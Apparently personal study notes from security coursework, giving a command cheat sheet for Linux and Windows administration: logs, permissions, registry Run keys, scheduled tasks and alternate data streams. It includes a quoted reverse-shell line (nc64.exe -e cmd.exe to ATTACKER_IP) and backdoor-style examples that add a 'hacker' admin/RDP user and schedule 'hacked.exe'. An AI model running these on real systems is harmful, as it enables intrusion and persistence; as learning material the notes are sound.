# Linux

## logfiles
`/var/log/auth.log` => authentication  
`/var/log/wtmp` => login/logout/runlevel change, special format need to use **last / who**

`dmesg` kernel log events  
`journalctl` systemd logs (**-r** reverse, **-f** follow, **-u** unit e.g. -u ssh.service)

## Disk

`free -m or -g` (mega / gigabyte)  
`df -h` (disk free)  
`du -hs <file/folder>` (usage)
`df -T` (determine type of filesystem)
`mount -t <type>` (list mounts of given type)

### Mount/Unmount USB

`sudo fdisk -l` (list devices)  
`sudo mount /dev/sdb1 /mnt/usb` (mount device sdb with "location" sdb1 to /mnt/usb)  

`sudo umount /mnt/usb`

## Curriculum

`# find / -type f \( -name "*.csv" -o -name "*.doc" \)  2>/dev/null` => find with multiple values 


# Windows

cmd `ver` => show version  

`attrib <file/folder>` => show attributes (attrib to modify attributes, like hidden or system)  

`dir /TW /OD` => /T< which timefield> /O < sort by>  (here, Time=Last Write, sort by date)  

## Environment

`%< XYZ >%` => e.g. echo %username%  
`set a=b` => list all env or modify in current session  
`setx a b` => modify env variable permanantly in registry  **/M** for system-wide all users

## Links

`mklink source target`  => symbolic
`mklink /h source target` => hardlink  

**.lnk file** => quick and dirty  `type Symlink.lnk | find "\"`  

## locate files

`dir /s *.exe` => /s recursive  
`tree /F` => tree visualization (F with files)  
`forfiles /P C:\Windows /S /M notepad.exe /c "cmd /c echo @PATH"` => P Start, S recursive, M what to search, c execute on every file  

## find / findstr / sort

`find` => used for text  
`findstr` => regex ability   
`sort /R` => reverse  

```
n-th line of file
findstr /n .* C:\Users\test\Desktop\large.txt | findstr "^123:"
```
`findstr /n .*` => add linenumber then "grep"  

`type test.txt | find /c /v "" ` => like wc -l

## Win security principal
Win uses security principal ~Entity  
Identified by `SID => S-1-1-0 Everyone` (each component special meaning, e.g. 3rd authority 5=individual account or group)  

`ACE` uses `SID`  
`ACL` consists of `ACE`, 6 types of ACE, each consist of: SID, set of access rights and several flags 

`LSA` also uses SIDs to assign access tokens

## Win groups and user
Default user:
- `Administrator` => S-1-5-domain-500, on Win10 default disabled during installation. Different account is been added to Administrators group  
- `Guest` => SID S-1-5-32-546, default disabled. Enable temporary login for users without account. **If enabled, mostly blank password.**  
- `SYSTEM` => used by the OS to run services which require elevated permissions. Default permissions like Admin, but doesn't require "logged in human".


<u>net command</u>

`net user hacker password123 /add` => **Add user**  
`net localgroup Administrators hacker /add` =>  **Add user to group**  
`net localgroup "Remote Desktop Users" hacker /add` => **Able to use RDP**
  
`net user hacker /del` => Delete user  
`net accounts` => show policies, e.g. password length  

`wmic useraccount get name where Disabled=TRUE` => list all disabled accounts  

<u>runas and cmd /c</u>  
_https://tryhackme.com/room/adenumeration_ 
- from THM `C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"` => /netonly only network operations
- `runas.exe /netonly /user:<domain>\<username> cmd.exe`  
- `dir \\za.tryhackme.com\SYSVOL` check if working inside AD  (_name=Kerberos, IP=NTLM_)  

## NTFS Permissions  
Files != Directories

<u>Files:</u>  
- **Read**, also allows to execute scripts 
- **Write**, does NOT allow to delete
- **Read & Execute**, also execute BINARIES
- **Modify**, read/write AND `delete`
- **Full Control**

<u>Directories:</u>
- **Read**, view and list any file
- **Write**, add files or subfolder
- **Read & Execute**, view/list files or subfolders AND execute binaries
- **List Folder Contents**, list files or subfolder AND execute binaries BUT NOT view file content  
- **Modify**, read/write/delete files and subfolders
- **Full Control**, allows deletion of files even not assign to files directly

_NTFS uses inheritance_ => folder permissions are propagated to child files or folders

`icacls` => view/edit permissions
- /T executes the operation recursively on all subfolders
- /C forces the operation to continue despite any errors
- /L is used with symbolic links. It causes the operation to be executed on the link itself rather than its target.

`icacls Test /grant Hacker:(OI)(CI)(F)` => add full permission of folder to Hacker
`icacls Test /deny Hacker` => delete permission
`icacls Test /grant:r Hacker:(RD,S)` => **:r** replace existing permissions, otherwise it only appends

`accesschk.exe "users" c:\` => from sysinternals

## Win Processes

_Kernel mode_ and _user mode_  
Kernel => mostly OS with access to hardware  
User => applications, without access to hardware  

System => allways PID 4  
System Idle Process => PID 0  

`tasklist /fi "name eq cmd.exe"` => /fi filter or use `| find <name>`  
`wmic process get processid,parentprocessid,executablepath` => get pid with parent  

Sysinternals:  
`pslist` => **-t tree like**, **-d threads**
`pskill`  
`pssuspend` => "pause" procees, `pssuspend -r` resume (_Name=all instances_, _PID=specific process_)  

`listdlls` => list process which calls dlls, **-u only usigned dlls**  

## Dlls
same format as .exe to reuse code  
on 64bit system, 64dlls C:\Windows\System32, SysWOW64 = 32bit  

## Registry

`HKEY_CLASSES_ROOT (HKCR)` =>  information related to file types and properties  
`HKEY_CURRENT_CONFIG (HKCC)` => hardware information  
`HKEY_CURRENT_USER (HKCU)` => user specific information  
`HKEY_LOCAL_MACHINE` => machine information, like memory, drives, I/O devices  
`HKEY_USERS` => default settings for new users    

**_Run_ and _RunOnce_** => getting executed if user logs in (RunOnce,gets deleted after start)  
<u>Default locations</u>

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
`req query hkcu\Software\Microsoft\Windows\CurrentVersion\Run` => query Reg  
`reg delete hkcu\software\microsoft\windows\currentversion\run /va` => delete ALL values  
`reg add hkcu\software\microsoft\windows\currentversion\run /v OneDrive /t REG_SZ /d "C:\Users\Offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe"` => add value, **/v value name**, **/t Type**, REG_SZ=null terminated String, **/d data**  

`reg export hkcu\test testfile` => export key or hive to file (hex data)  
`reg import <filename>`=> import previously exported data    


## Scheduled tasks

`schtasks` => list  
`C:\>schtasks /create /sc weekly /d mon /tn hax0r /tr C:\hacked.exe /st 10:00` => run hacked.exe every mondy at 10:00  
`schtasks /delete /tn hax0r` => delete task hax0r  
`C:\>schtasks /query /TN hax0r /fo LIST` => query task hx0r, output format=list  

## Disk utils and ADS

`fsutil` => disk information  
`du` (Sysinternals) => like linux  


`echo 123 > test.txt:adsStream` => write to ads  
`dir /R` => show ADS info  
`more < test.txt:adsStream` => output stream data  
`streams` => **Sysinternals** for ADS  

# Network

`sudo -E wireshark` => sudo -E  run as root but preserve Environment  
